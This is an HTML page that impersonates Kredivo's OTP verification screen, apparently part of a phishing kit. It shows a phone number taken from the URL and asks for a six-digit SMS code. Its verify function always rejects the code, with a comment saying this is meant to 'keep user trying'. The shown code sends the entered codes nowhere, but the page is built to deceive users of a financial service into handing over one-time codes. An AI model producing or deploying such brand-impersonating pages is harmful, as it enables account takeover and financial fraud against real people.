<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Verifikasi OTP — Kredivo</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .screen {
      width: 100%;
      max-width: 390px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: #fff;
    }

    /* Header */
    .header {
      display: flex;
      align-items: center;
      padding: 56px 20px 16px;
      gap: 12px;
    }

    .back-btn {
      width: 36px;
      height: 36px;
      border: none;
      background: #f5f5f5;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      flex-shrink: 0;
    }

    .back-btn svg {
      width: 18px;
      height: 18px;
    }

    .header-logo {
      font-size: 18px;
      font-weight: 800;
      color: #E5192A;
      letter-spacing: 0.5px;
    }

    /* Content */
    .content {
      flex: 1;
      padding: 32px 28px 40px;
    }

    .icon-wrap {
      width: 64px;
      height: 64px;
      background: #fff0f1;
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 24px;
    }

    .icon-wrap svg {
      width: 32px;
      height: 32px;
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 8px;
    }

    .subtitle {
      font-size: 14px;
      color: #888;
      line-height: 1.6;
      margin-bottom: 36px;
    }

    .subtitle strong {
      color: #1a1a1a;
      font-weight: 600;
    }

    /* OTP Inputs */
    .otp-wrap {
      display: flex;
      gap: 10px;
      margin-bottom: 12px;
      justify-content: center;
    }

    .otp-input {
      width: 48px;
      height: 56px;
      border: 1.5px solid #ddd;
      border-radius: 12px;
      text-align: center;
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      outline: none;
      transition: border-color 0.2s;
      background: #fafafa;
      caret-color: #E5192A;
    }

    .otp-input:focus {
      border-color: #E5192A;
      background: #fff;
    }

    .otp-input.filled {
      border-color: #E5192A;
      background: #fff0f1;
    }

    /* Timer */
    .timer-wrap {
      text-align: center;
      margin-bottom: 32px;
      font-size: 14px;
      color: #aaa;
    }

    .timer-wrap span {
      color: #E5192A;
      font-weight: 700;
    }

    .resend-btn {
      background: none;
      border: none;
      color: #E5192A;
      font-weight: 700;
      font-size: 14px;
      cursor: pointer;
      display: none;
    }

    /* Submit */
    .btn-submit {
      width: 100%;
      height: 52px;
      background: #E5192A;
      color: #fff;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }

    .btn-submit:active {
      background: #c41422;
      transform: scale(0.98);
    }

    .btn-submit:disabled {
      background: #f5a0a7;
      cursor: not-allowed;
    }

    /* Error */
    .error-msg {
      text-align: center;
      font-size: 13px;
      color: #E5192A;
      margin-bottom: 16px;
      min-height: 18px;
    }
  </style>
</head>
<body>
  <div class="screen">
    <div class="header">
      <button class="back-btn" onclick="history.back()">
        <svg viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="15 18 9 12 15 6"></polyline>
        </svg>
      </button>
      <span class="header-logo">kredivo</span>
    </div>

    <div class="content">
      <div class="icon-wrap">
        <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect x="4" y="6" width="24" height="20" rx="4" stroke="#E5192A" stroke-width="2"/>
          <path d="M4 11h24" stroke="#E5192A" stroke-width="2"/>
          <circle cx="10" cy="19" r="1.5" fill="#E5192A"/>
          <circle cx="16" cy="19" r="1.5" fill="#E5192A"/>
          <circle cx="22" cy="19" r="1.5" fill="#E5192A"/>
        </svg>
      </div>

      <div class="title">Masukkan Kode OTP</div>
      <div class="subtitle">
        Kode OTP telah dikirim via SMS ke nomor<br/>
        <strong id="phone-display">+62 xxx</strong>
      </div>

      <div class="otp-wrap" id="otp-wrap">
        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric" />
        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric" />
        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric" />
        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric" />
        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric" />
        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric" />
      </div>

      <div class="error-msg" id="error-msg"></div>

      <div class="timer-wrap">
        Kirim ulang OTP dalam <span id="timer">01:30</span>
        <button class="resend-btn" id="resend-btn" onclick="resendOtp()">Kirim Ulang</button>
      </div>

      <button class="btn-submit" id="btn-verify" onclick="verifyOtp()" disabled>
        Verifikasi
      </button>
    </div>
  </div>

  <script>
    // Get phone from URL param
    const params = new URLSearchParams(window.location.search);
    const phone = params.get('p') || '';
    if (phone) {
      const formatted = phone.replace(/(\d{3})(\d{4})(\d+)/, '$1 $2 $3');
      document.getElementById('phone-display').textContent = '+62 ' + formatted;
    }

    // OTP input navigation
    const inputs = document.querySelectorAll('.otp-input');

    inputs.forEach((inp, i) => {
      inp.addEventListener('input', () => {
        inp.value = inp.value.replace(/\D/g, '').slice(-1);
        if (inp.value) {
          inp.classList.add('filled');
          if (i < inputs.length - 1) inputs[i + 1].focus();
        } else {
          inp.classList.remove('filled');
        }
        checkComplete();
      });

      inp.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !inp.value && i > 0) {
          inputs[i - 1].focus();
          inputs[i - 1].value = '';
          inputs[i - 1].classList.remove('filled');
          checkComplete();
        }
      });

      inp.addEventListener('paste', (e) => {
        e.preventDefault();
        const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
        text.split('').forEach((ch, j) => {
          if (inputs[j]) {
            inputs[j].value = ch;
            inputs[j].classList.add('filled');
          }
        });
        if (inputs[Math.min(text.length, 5)]) inputs[Math.min(text.length, 5)].focus();
        checkComplete();
      });
    });

    inputs[0].focus();

    function checkComplete() {
      const otp = getOtp();
      document.getElementById('btn-verify').disabled = otp.length < 6;
    }

    function getOtp() {
      return Array.from(inputs).map(i => i.value).join('');
    }

    // Timer
    let seconds = 90;
    const timerEl = document.getElementById('timer');
    const resendBtn = document.getElementById('resend-btn');

    const timer = setInterval(() => {
      seconds--;
      const m = String(Math.floor(seconds / 60)).padStart(2, '0');
      const s = String(seconds % 60).padStart(2, '0');
      timerEl.textContent = m + ':' + s;
      if (seconds <= 0) {
        clearInterval(timer);
        timerEl.style.display = 'none';
        resendBtn.style.display = 'inline';
        document.querySelector('.timer-wrap').innerHTML = '';
        resendBtn.style.display = 'inline';
        document.querySelector('.timer-wrap').appendChild(resendBtn);
        resendBtn.style.display = 'inline';
      }
    }, 1000);

    function resendOtp() {
    }

    function verifyOtp() {
      const otp = getOtp();
      if (otp.length < 6) return;

      const btn = document.getElementById('btn-verify');
      btn.textContent = 'Memverifikasi...';
      btn.disabled = true;
      document.getElementById('error-msg').textContent = '';

      // Simulate wrong OTP to keep user trying
      setTimeout(() => {
        document.getElementById('error-msg').textContent = 'Kode OTP tidak valid. Silakan coba lagi.';
        inputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
        inputs[0].focus();
        btn.textContent = 'Verifikasi';
        btn.disabled = true;
      }, 1200);
    }
  </script>
</body>
</html>
